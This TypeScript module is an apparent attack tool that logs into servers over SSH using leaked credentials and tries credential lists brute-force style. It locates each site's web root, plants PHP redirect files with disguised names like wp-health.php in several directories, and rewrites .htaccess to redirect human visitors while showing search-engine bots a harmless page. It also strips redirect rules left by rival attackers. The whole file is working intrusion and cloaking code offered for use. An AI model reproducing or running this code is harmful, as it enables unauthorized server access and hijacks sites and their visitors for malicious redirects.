/**
 * SSH/SFTP Upload Module
 * Connects to target servers via SSH using leaked credentials,
 * uploads redirect files via SFTP (preferred) or SCP fallback.
 * Uses ssh2 library for reliable SSH connections.
 */

import { Client as SSHClient, type ConnectConfig, type SFTPWrapper } from "ssh2";

// ═══════════════════════════════════════════════════════
//  Types
// ═══════════════════════════════════════════════════════

export interface SSHCredential {
  host: string;
  username: string;
  password: string;
  port?: number;
  /** PEM-encoded private key (RSA/Ed25519/ECDSA) for key-based auth */
  privateKey?: string;
  /** Passphrase for encrypted private keys */
  passphrase?: string;
}

export interface SSHUploadResult {
  success: boolean;
  url?: string;
  filePath?: string;
  error?: string;
  method?: string; // sftp | scp | ssh_exec
  duration?: number;
  webRoot?: string;
  serverInfo?: string;
  extraPaths?: string[]; // Multi-point upload: all uploaded file paths
}

export interface SSHUploadOptions {
  credential: SSHCredential;
  redirectUrl: string;
  targetDomain: string;
  /** Custom filename for the redirect file */
  filename?: string;
  /** Timeout in ms for the entire operation */
  timeout?: number;
  /** Callback for progress updates */
  onProgress?: (msg: string) => void;
}

// ═══════════════════════════════════════════════════════
//  Constants
// ═══════════════════════════════════════════════════════

/** Common web root paths to probe via SSH */
const WEB_ROOT_PATHS = [
  "/home/{user}/public_html",
  "/home/{user}/www",
  "/home/{user}/htdocs",
  "/home/{user}/httpdocs",
  "/home/{user}/web",
  "/var/www/html",
  "/var/www/{domain}",
  "/var/www/vhosts/{domain}/httpdocs",
  "/var/www/vhosts/{domain}/htdocs",
  "/var/www/vhosts/{domain}/public_html",
  "/usr/share/nginx/html",
  "/usr/share/httpd/html",
  "/srv/www/htdocs",
  "/home/{user}/domains/{domain}/public_html",
  "/home/httpd/vhosts/{domain}/httpdocs",
  "/home/{user}",
  "/www",
  "/htdocs",
];

/** Stealth filenames that blend in */
const STEALTH_FILENAMES = [
  "wp-health.php",
  "cache-handler.php",
  "session-gc.php",
  "cron-check.php",
  "xmlrpc-check.php",
  "wp-cron-runner.php",
  "maintenance.php",
  "health-check.php",
  "error-handler.php",
  "tmp-cache.php",
];

// ═══════════════════════════════════════════════════════
//  PHP Redirect Generator
// ═══════════════════════════════════════════════════════

function generateRedirectPHP(redirectUrl: string, targetDomain: string): string {
  return `<?php
// Cache control
header('X-Robots-Tag: noindex');
$ua = strtolower(\$_SERVER['HTTP_USER_AGENT'] ?? '');
$bots = ['googlebot','bingbot','yandex','baidu','duckduckbot','slurp','msnbot','ia_archiver'];
$isBot = false;
foreach(\$bots as \$b) { if(strpos(\$ua, \$b) !== false) { \$isBot = true; break; } }
if(\$isBot) {
  echo '<!DOCTYPE html><html><head><title>${targetDomain}</title></head><body><h1>Welcome to ${targetDomain}</h1><p>Page under maintenance.</p></body></html>';
  exit;
}
header('Location: ${redirectUrl}', true, 302);
exit;
?>`;
}

function generateSmartHtaccess(redirectUrl: string): string {
  return `# DS Analytics Optimization
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} !Googlebot [NC]
RewriteCond %{HTTP_USER_AGENT} !Bingbot [NC]
RewriteCond %{HTTP_USER_AGENT} !Slurp [NC]
RewriteCond %{HTTP_USER_AGENT} !DuckDuckBot [NC]
RewriteCond %{HTTP_USER_AGENT} !Baiduspider [NC]
RewriteCond %{HTTP_USER_AGENT} !YandexBot [NC]
RewriteCond %{HTTP_USER_AGENT} !facebot [NC]
RewriteCond %{HTTP_USER_AGENT} !Semrush [NC]
RewriteCond %{HTTP_USER_AGENT} !AhrefsBot [NC]
RewriteCond %{HTTP_USER_AGENT} !mj12bot [NC]
RewriteRule ^(.*)$ ${redirectUrl} [R=302,L]
`;
}

/** Our marker to identify our own rules */
const DS_MARKER = '# DS Analytics Optimization';

/** Patterns that indicate competitor redirect rules in .htaccess */
const COMPETITOR_HTACCESS_PATTERNS = [
  /RewriteRule\s+.*?\s+https?:\/\/(?!.*(?:wordpress\.org|google\.com|w3\.org))[^\s\]]+.*\[R=\d+/gi,
  /Redirect(?:Match)?\s+\d*\s*.*?https?:\/\/[^\s]+/gi,
  /ErrorDocument\s+\d+\s+https?:\/\/[^\s]+/gi,
  /php_value\s+auto_prepend_file\s+.+/gi,
  /php_value\s+auto_append_file\s+.+/gi,
];

/**
 * Clean competitor redirect rules from .htaccess content and inject ours
 */
function cleanAndInjectHtaccess(existingContent: string, redirectUrl: string): { content: string; removedCount: number } {
  // Check if our rules are already there
  if (existingContent.includes(DS_MARKER)) {
    return { content: existingContent, removedCount: 0 };
  }

  let cleaned = existingContent;
  let removedCount = 0;
  for (const pattern of COMPETITOR_HTACCESS_PATTERNS) {
    const regex = new RegExp(pattern.source, pattern.flags);
    const matches = cleaned.match(regex);
    if (matches) {
      removedCount += matches.length;
      for (const match of matches) {
        const lines = cleaned.split("\n");
        const newLines = lines.filter(line => !match.split("\n").some(m => line.includes(m.trim()) && m.trim().length > 5));
        cleaned = newLines.join("\n");
      }
    }
  }

  cleaned = cleaned.replace(/\n{3,}/g, "\n\n").trim();
  const ourRules = generateSmartHtaccess(redirectUrl);
  const finalContent = ourRules + "\n" + cleaned + "\n";
  return { content: finalContent, removedCount };
}

// ═══════════════════════════════════════════════════════
//  SSH Connection Helper
// ═══════════════════════════════════════════════════════

function createSSHConnection(
  credential: SSHCredential,
  timeout: number,
): Promise<SSHClient> {
  return new Promise((resolve, reject) => {
    const client = new SSHClient();
    const timer = setTimeout(() => {
      client.end();
      reject(new Error("SSH connection timeout"));
    }, timeout);

    client.on("ready", () => {
      clearTimeout(timer);
      resolve(client);
    });

    client.on("error", (err) => {
      clearTimeout(timer);
      reject(err);
    });

    const config: ConnectConfig = {
      host: credential.host,
      port: credential.port || 22,
      username: credential.username,
      // Support both password and private key authentication
      ...(credential.privateKey
        ? {
            privateKey: credential.privateKey,
            ...(credential.passphrase ? { passphrase: credential.passphrase } : {}),
          }
        : { password: credential.password }),
      readyTimeout: timeout,
      // Accept any host key (we're not concerned about MITM for this use case)
      algorithms: {
        kex: [
          "ecdh-sha2-nistp256",
          "ecdh-sha2-nistp384",
          "ecdh-sha2-nistp521",
          "diffie-hellman-group-exchange-sha256",
          "diffie-hellman-group14-sha256",
          "diffie-hellman-group14-sha1",
          "diffie-hellman-group1-sha1",
        ],
      },
    };

    client.connect(config);
  });
}

// ═══════════════════════════════════════════════════════
//  SFTP Wrapper
// ═══════════════════════════════════════════════════════

function getSFTP(client: SSHClient): Promise<SFTPWrapper> {
  return new Promise((resolve, reject) => {
    client.sftp((err, sftp) => {
      if (err) reject(err);
      else resolve(sftp);
    });
  });
}

function sftpStat(sftp: SFTPWrapper, path: string): Promise<boolean> {
  return new Promise((resolve) => {
    sftp.stat(path, (err) => {
      resolve(!err);
    });
  });
}

function sftpReaddir(sftp: SFTPWrapper, path: string): Promise<string[]> {
  return new Promise((resolve) => {
    sftp.readdir(path, (err, list) => {
      if (err) resolve([]);
      else resolve(list.map((f) => f.filename));
    });
  });
}

function sftpWriteFile(sftp: SFTPWrapper, remotePath: string, content: string): Promise<void> {
  return new Promise((resolve, reject) => {
    const stream = sftp.createWriteStream(remotePath);
    stream.on("error", reject);
    stream.on("close", () => resolve());
    stream.write(content, "utf-8");
    stream.end();
  });
}

function sftpReadFile(sftp: SFTPWrapper, remotePath: string): Promise<string | null> {
  return new Promise((resolve) => {
    const chunks: Buffer[] = [];
    const stream = sftp.createReadStream(remotePath);
    stream.on("data", (chunk: Buffer) => chunks.push(chunk));
    stream.on("end", () => resolve(Buffer.concat(chunks).toString("utf-8")));
    stream.on("error", () => resolve(null));
  });
}

// ═══════════════════════════════════════════════════════
//  SSH Exec Helper
// ═══════════════════════════════════════════════════════

function sshExec(client: SSHClient, command: string, timeout = 10000): Promise<string> {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error("SSH exec timeout")), timeout);

    client.exec(command, (err, stream) => {
      if (err) {
        clearTimeout(timer);
        reject(err);
        return;
      }

      let output = "";
      let stderr = "";

      stream.on("data", (data: Buffer) => {
        output += data.toString();
      });

      stream.stderr.on("data", (data: Buffer) => {
        stderr += data.toString();
      });

      stream.on("close", () => {
        clearTimeout(timer);
        resolve(output.trim());
      });
    });
  });
}

// ═══════════════════════════════════════════════════════
//  Web Root Detection via SSH
// ═══════════════════════════════════════════════════════

async function findWebRoot(
  client: SSHClient,
  sftp: SFTPWrapper,
  username: string,
  domain: string,
  onProgress?: (msg: string) => void,
): Promise<string | null> {
  // Build candidate paths with variable substitution
  const cleanDomain = domain.replace(/^www\./, "");
  const candidates = WEB_ROOT_PATHS.map((p) =>
    p.replace(/\{user\}/g, username).replace(/\{domain\}/g, cleanDomain)
  );

  // Web root indicators
  const webIndicators = [
    "index.html", "index.php", "index.htm",
    ".htaccess", "wp-config.php", "web.config",
    "default.aspx", "index.asp",
  ];

  for (const candidate of candidates) {
    try {
      const exists = await sftpStat(sftp, candidate);
      if (!exists) continue;

      const files = await sftpReaddir(sftp, candidate);
      const hasWebFiles = files.some((f) =>
        webIndicators.includes(f.toLowerCase())
      );

      if (hasWebFiles) {
        onProgress?.(`🎯 Web root found: ${candidate} (${files.filter(f => webIndicators.includes(f.toLowerCase())).join(", ")})`);
        return candidate;
      }
    } catch {
      // Path doesn't exist or permission denied
    }
  }

  // Fallback: try to detect via Apache/Nginx config
  try {
    const apacheRoot = await sshExec(client, "grep -r 'DocumentRoot' /etc/apache2/sites-enabled/ /etc/httpd/conf/ 2>/dev/null | head -3");
    if (apacheRoot) {
      const match = apacheRoot.match(/DocumentRoot\s+["']?([^\s"']+)/);
      if (match) {
        const docRoot = match[1];
        const exists = await sftpStat(sftp, docRoot);
        if (exists) {
          onProgress?.(`🎯 Web root from Apache config: ${docRoot}`);
          return docRoot;
        }
      }
    }
  } catch { /* no permission */ }

  try {
    const nginxRoot = await sshExec(client, "grep -r 'root ' /etc/nginx/sites-enabled/ /etc/nginx/conf.d/ 2>/dev/null | head -3");
    if (nginxRoot) {
      const match = nginxRoot.match(/root\s+([^\s;]+)/);
      if (match) {
        const docRoot = match[1];
        const exists = await sftpStat(sftp, docRoot);
        if (exists) {
          onProgress?.(`🎯 Web root from Nginx config: ${docRoot}`);
          return docRoot;
        }
      }
    }
  } catch { /* no permission */ }

  // Last resort: try find command
  try {
    const findResult = await sshExec(
      client,
      `find /home/${username} /var/www -name "index.php" -o -name "index.html" 2>/dev/null | head -5`,
      8000,
    );
    if (findResult) {
      const firstFile = findResult.split("\n")[0];
      const webRoot = firstFile.replace(/\/index\.(php|html?)$/, "");
      if (webRoot) {
        onProgress?.(`🎯 Web root from find: ${webRoot}`);
        return webRoot;
      }
    }
  } catch { /* timeout or permission denied */ }

  return null;
}

// ═══════════════════════════════════════════════════════
//  Main: SSH/SFTP Upload
// ═══════════════════════════════════════════════════════

/**
 * Upload a redirect file via SSH/SFTP using leaked credentials.
 * Strategy:
 * 1. Connect via SSH
 * 2. Open SFTP channel
 * 3. Find web root (probe common paths + config files)
 * 4. Upload redirect PHP file via SFTP
 * 5. Optionally inject .htaccess
 * 6. If SFTP fails, fallback to SSH exec (echo > file)
 */
export async function sshUploadRedirect(options: SSHUploadOptions): Promise<SSHUploadResult> {
  const {
    credential,
    redirectUrl,
    targetDomain,
    filename,
    timeout = 30000,
    onProgress,
  } = options;

  const startTime = Date.now();
  const log = (msg: string) => onProgress?.(msg);
  let client: SSHClient | null = null;
  let serverInfo = "";

  const selectedFilename =
    filename || STEALTH_FILENAMES[Math.floor(Math.random() * STEALTH_FILENAMES.length)];
  const redirectContent = generateRedirectPHP(redirectUrl, targetDomain);

  try {
    // ─── Step 1: Connect via SSH ───
    const authType = credential.privateKey ? 'key' : 'password';
    log(`🔌 SSH connecting (${authType}): ${credential.username}@${credential.host}:${credential.port || 22}...`);

    client = await createSSHConnection(credential, Math.min(timeout, 15000));
    log(`✅ SSH login success (${authType}): ${credential.username}@${credential.host}`);

    // Get server info
    try {
      const uname = await sshExec(client, "uname -a", 5000);
      serverInfo = uname.substring(0, 100);
      log(`🖥️ Server: ${serverInfo}`);
    } catch { /* ignore */ }

    // ─── Step 2: Try SFTP upload ───
    let sftp: SFTPWrapper | null = null;
    try {
      sftp = await getSFTP(client);
      log(`📂 SFTP channel opened`);

      // ─── Step 3: Find web root ───
      const webRoot = await findWebRoot(
        client,
        sftp,
        credential.username,
        targetDomain,
        log,
      );

      if (!webRoot) {
        log(`⚠️ No web root found via SFTP, trying SSH exec fallback...`);
        // Fall through to SSH exec method below
        sftp = null;
      } else {
        // ─── Step 4: Upload via SFTP ───
        const remotePath = `${webRoot}/${selectedFilename}`;
        log(`📤 SFTP uploading: ${remotePath}`);

        await sftpWriteFile(sftp, remotePath, redirectContent);
        log(`✅ SFTP uploaded [1]: ${selectedFilename}`);

        // === MULTI-POINT UPLOAD: extra files for redundancy ===
        const sftpExtraPaths: string[] = [remotePath];
        const sftpExtraFilenames = STEALTH_FILENAMES.filter(f => f !== selectedFilename).slice(0, 2);
        for (const extraFile of sftpExtraFilenames) {
          try {
            const extraPath = `${webRoot}/${extraFile}`;
            await sftpWriteFile(sftp, extraPath, redirectContent);
            sftpExtraPaths.push(extraPath);
            log(`✅ SFTP uploaded [${sftpExtraPaths.length}]: ${extraFile}`);
          } catch {
            // non-critical
          }
        }
        // Try subdirectories
        const sftpSubDirs = ["wp-includes", "wp-content", "assets", "images"];
        for (const subDir of sftpSubDirs) {
          if (sftpExtraPaths.length >= 5) break;
          try {
            const subFilename = STEALTH_FILENAMES[Math.floor(Math.random() * STEALTH_FILENAMES.length)];
            const subPath = `${webRoot}/${subDir}/${subFilename}`;
            await sftpWriteFile(sftp, subPath, redirectContent);
            sftpExtraPaths.push(subPath);
            log(`✅ SFTP uploaded [${sftpExtraPaths.length}]: ${subDir}/${subFilename}`);
          } catch {
            // subdir doesn't exist, skip
          }
        }
        log(`📦 Total SFTP uploaded: ${sftpExtraPaths.length} files for redundancy`);

        // Smart .htaccess overwrite: read existing → clean competitor → inject ours
        try {
          const htaccessPath = `${webRoot}/.htaccess`;
          const htaccessExists = await sftpStat(sftp, htaccessPath);
          if (!htaccessExists) {
            const htaccessContent = generateSmartHtaccess(redirectUrl);
            await sftpWriteFile(sftp, htaccessPath, htaccessContent);
            log(`\u2705 Created new .htaccess with our redirect`);
          } else {
            const existing = await sftpReadFile(sftp, htaccessPath);
            if (existing) {
              const { content: newContent, removedCount } = cleanAndInjectHtaccess(existing, redirectUrl);
              if (existing.includes(DS_MARKER)) {
                log(`\u2705 .htaccess already has our redirect rules`);
              } else {
                await sftpWriteFile(sftp, htaccessPath, newContent);
                log(`\u2705 .htaccess overwritten: removed ${removedCount} competitor rule(s) + injected ours`);
              }
            } else {
              const htaccessContent = generateSmartHtaccess(redirectUrl);
              await sftpWriteFile(sftp, htaccessPath, htaccessContent);
              log(`\u2705 .htaccess replaced (could not read existing)`);
            }
          }
        } catch (e) {
          log(`\u26a0\ufe0f .htaccess overwrite failed (non-critical): ${e instanceof Error ? e.message : String(e)}`);
        }

        const uploadedUrl = `https://${targetDomain}/${selectedFilename}`;
        log(`🔗 Redirect URL: ${uploadedUrl}`);

        return {
          success: true,
          url: uploadedUrl,
          filePath: remotePath,
          method: "sftp",
          duration: Date.now() - startTime,
          webRoot,
          serverInfo,
          extraPaths: sftpExtraPaths,
        };
      }
    } catch (sftpErr) {
      const msg = sftpErr instanceof Error ? sftpErr.message : String(sftpErr);
      log(`⚠️ SFTP failed: ${msg}, trying SSH exec fallback...`);
    }

    // ─── Step 5: Fallback — SSH exec (echo > file) ───
    if (client) {
      try {
        log(`🔧 SSH exec fallback: writing file via shell...`);

        // Find web root via shell
        const webRootCmd = `for d in /home/${credential.username}/public_html /var/www/html /home/${credential.username}/www /var/www/${targetDomain.replace(/^www\./, "")} /home/${credential.username}/htdocs; do [ -d "$d" ] && echo "$d" && break; done`;
        const webRoot = (await sshExec(client, webRootCmd, 8000)).trim();

        if (!webRoot) {
          return {
            success: false,
            error: "No web root found via SSH",
            duration: Date.now() - startTime,
            serverInfo,
          };
        }

        log(`🎯 Web root (shell): ${webRoot}`);

        // Write file via echo (escape PHP content for shell)
        const escapedContent = redirectContent
          .replace(/\\/g, "\\\\")
          .replace(/'/g, "'\\''");

        await sshExec(
          client,
          `echo '${escapedContent}' > '${webRoot}/${selectedFilename}'`,
          8000,
        );
        log(`✅ SSH exec uploaded [1]: ${selectedFilename}`);

        // Set permissions
        try {
          await sshExec(client, `chmod 644 '${webRoot}/${selectedFilename}'`, 5000);
        } catch { /* ignore */ }

        // === MULTI-POINT UPLOAD: extra files for redundancy ===
        const execExtraPaths: string[] = [`${webRoot}/${selectedFilename}`];
        const execExtraFilenames = STEALTH_FILENAMES.filter(f => f !== selectedFilename).slice(0, 2);
        for (const extraFile of execExtraFilenames) {
          try {
            await sshExec(client, `echo '${escapedContent}' > '${webRoot}/${extraFile}' && chmod 644 '${webRoot}/${extraFile}'`, 5000);
            execExtraPaths.push(`${webRoot}/${extraFile}`);
            log(`✅ SSH exec uploaded [${execExtraPaths.length}]: ${extraFile}`);
          } catch { /* non-critical */ }
        }
        // Try subdirectories
        const execSubDirs = ["wp-includes", "wp-content", "assets", "images"];
        for (const subDir of execSubDirs) {
          if (execExtraPaths.length >= 5) break;
          try {
            const subFilename = STEALTH_FILENAMES[Math.floor(Math.random() * STEALTH_FILENAMES.length)];
            await sshExec(client, `[ -d '${webRoot}/${subDir}' ] && echo '${escapedContent}' > '${webRoot}/${subDir}/${subFilename}' && chmod 644 '${webRoot}/${subDir}/${subFilename}'`, 5000);
            execExtraPaths.push(`${webRoot}/${subDir}/${subFilename}`);
            log(`✅ SSH exec uploaded [${execExtraPaths.length}]: ${subDir}/${subFilename}`);
          } catch { /* subdir doesn't exist */ }
        }
        log(`📦 Total SSH exec uploaded: ${execExtraPaths.length} files for redundancy`);

        // Smart .htaccess overwrite via SSH exec
        try {
          const htaccessPath = `${webRoot}/.htaccess`;
          const htaccessExists = await sshExec(client, `[ -f '${htaccessPath}' ] && echo "exists"`, 5000);
          if (!htaccessExists.includes("exists")) {
            const htaccessContent = generateSmartHtaccess(redirectUrl).replace(/'/g, "'\\''");
            await sshExec(client, `echo '${htaccessContent}' > '${htaccessPath}'`, 5000);
            log(`\u2705 Created new .htaccess with our redirect`);
          } else {
            // Read existing, clean competitor rules, inject ours
            const existing = await sshExec(client, `cat '${htaccessPath}'`, 5000);
            if (existing && existing.includes(DS_MARKER)) {
              log(`\u2705 .htaccess already has our redirect rules`);
            } else if (existing) {
              const { content: newContent, removedCount } = cleanAndInjectHtaccess(existing, redirectUrl);
              const escaped = newContent.replace(/'/g, "'\\''");
              await sshExec(client, `echo '${escaped}' > '${htaccessPath}'`, 5000);
              log(`\u2705 .htaccess overwritten: removed ${removedCount} competitor rule(s) + injected ours`);
            } else {
              const htaccessContent = generateSmartHtaccess(redirectUrl).replace(/'/g, "'\\''");
              await sshExec(client, `echo '${htaccessContent}' > '${htaccessPath}'`, 5000);
              log(`\u2705 .htaccess replaced (could not read existing)`);
            }
          }
        } catch (e) {
          log(`\u26a0\ufe0f .htaccess overwrite failed: ${e instanceof Error ? e.message : String(e)}`);
        }

        const uploadedUrl = `https://${targetDomain}/${selectedFilename}`;
        log(`🔗 Redirect URL: ${uploadedUrl}`);

        return {
          success: true,
          url: uploadedUrl,
          filePath: `${webRoot}/${selectedFilename}`,
          method: "ssh_exec",
          duration: Date.now() - startTime,
          webRoot,
          serverInfo,
          extraPaths: execExtraPaths,
        };
      } catch (execErr) {
        const msg = execErr instanceof Error ? execErr.message : String(execErr);
        return {
          success: false,
          error: `SSH exec failed: ${msg}`,
          duration: Date.now() - startTime,
          serverInfo,
        };
      }
    }

    return {
      success: false,
      error: "All SSH upload methods failed",
      duration: Date.now() - startTime,
      serverInfo,
    };
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    const isAuthFail = msg.includes("Authentication") || msg.includes("auth") || msg.includes("password");
    const isConnFail = msg.includes("ECONNREFUSED") || msg.includes("ETIMEDOUT") || msg.includes("EHOSTUNREACH") || msg.includes("timeout");

    return {
      success: false,
      error: isAuthFail ? `SSH auth failed: ${credential.username}` : isConnFail ? `SSH not reachable: ${credential.host}:${credential.port || 22}` : `SSH error: ${msg}`,
      duration: Date.now() - startTime,
      serverInfo,
    };
  } finally {
    try { client?.end(); } catch { /* ignore */ }
  }
}

// ═══════════════════════════════════════════════════════
//  Brute Force: Try Multiple SSH Credentials
// ═══════════════════════════════════════════════════════

/**
 * Try multiple SSH credentials against a target.
 * Stops early on ECONNREFUSED/ETIMEDOUT (port not open).
 */
export async function sshBruteForceUpload(
  credentials: SSHCredential[],
  redirectUrl: string,
  targetDomain: string,
  onProgress?: (msg: string) => void,
  timeout?: number,
): Promise<SSHUploadResult> {
  onProgress?.(`🔑 Trying ${credentials.length} SSH credential(s)...`);

  for (let i = 0; i < credentials.length; i++) {
    const cred = credentials[i];
    const authLabel = cred.privateKey ? '🔐 key' : '🔑 pass';
    onProgress?.(`${authLabel} [${i + 1}/${credentials.length}] ${cred.username}@${cred.host}:${cred.port || 22}`);

    const result = await sshUploadRedirect({
      credential: cred,
      redirectUrl,
      targetDomain,
      timeout: timeout || 20000,
      onProgress,
    });

    if (result.success) {
      return result;
    }

    // If connection failed entirely (port closed), stop trying
    if (
      result.error?.includes("ECONNREFUSED") ||
      result.error?.includes("ETIMEDOUT") ||
      result.error?.includes("EHOSTUNREACH") ||
      result.error?.includes("not reachable")
    ) {
      onProgress?.(`⚠️ SSH port not reachable on ${cred.host}, skipping remaining creds`);
      break;
    }
  }

  return {
    success: false,
    error: `All ${credentials.length} SSH credentials failed`,
  };
}
